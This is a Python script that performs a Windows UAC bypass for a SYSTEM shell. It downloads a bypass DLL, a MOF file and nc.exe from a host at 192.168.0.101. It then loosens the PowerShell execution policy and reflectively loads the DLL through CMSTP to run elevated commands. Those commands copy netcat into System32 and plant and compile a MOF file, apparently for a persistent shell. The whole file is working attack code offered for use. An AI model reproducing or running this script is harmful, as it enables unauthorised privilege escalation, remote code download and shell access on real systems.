#!/usr/bin/python    
#__Author__ == 'Ananth Venkateswarlu aka she11z' 
# UAC bypass to get system shell using csmtp.exe & MOF

import os
import sys
import tempfile
import requests
import subprocess
from time import sleep

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
dll_url = 'http://192.168.0.101/privilege/CMSTP-UAC-Bypass.dll'
dll_file = dll_url.split('/')[-1]
MOF_url = 'http://192.168.0.101/privilege/initial.mof'
MOF_file = MOF_url.split('/')[-1]
nc_url = 'http://192.168.0.101/privilege/nc.exe'
nc_file = nc_url.split('/')[-1]

dll_response = requests.get(dll_url)
with open(dll_file, 'wb') as dllfile:
	dllfile.write(dll_response.content)

MOF_response = requests.get(MOF_url)
with open(MOF_file, 'wb') as MOFfile:
	MOFfile.write(MOF_response.content)
	
nc_response = requests.get(nc_url)
with open(nc_file, 'wb') as ncfile:
	ncfile.write(nc_response.content)

script_privilege = 'powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force'

copy_nc = 'powershell -command "[Reflection.Assembly]::Load([IO.File]::ReadAllBytes(\'CMSTP-UAC-Bypass.dll\'))" ; \
"[CMSTPBypass]::Execute(\'cmd.exe /c copy ' + temp_directory + '\\nc.exe C:\\windows\\system32\\nc.exe\')"'

copy_mof = 'powershell -command "[Reflection.Assembly]::Load([IO.File]::ReadAllBytes(\'CMSTP-UAC-Bypass.dll\'))" ; \
"[CMSTPBypass]::Execute(\'cmd.exe /c copy ' + temp_directory + '\\initial.mof C:\\windows\\system32\\wbem\\MOF\\initial.mof\')"'

run_mof = 'powershell -command "[Reflection.Assembly]::Load([IO.File]::ReadAllBytes(\'CMSTP-UAC-Bypass.dll\'))" ; \
"[CMSTPBypass]::Execute(\'mofcomp C:\\Windows\\System32\\wbem\\MOF\\initial.mof\')"'

subprocess.call(script_privilege)
subprocess.call(copy_nc)
sleep(1)
subprocess.call(copy_mof)
sleep(1)
subprocess.call(run_mof)
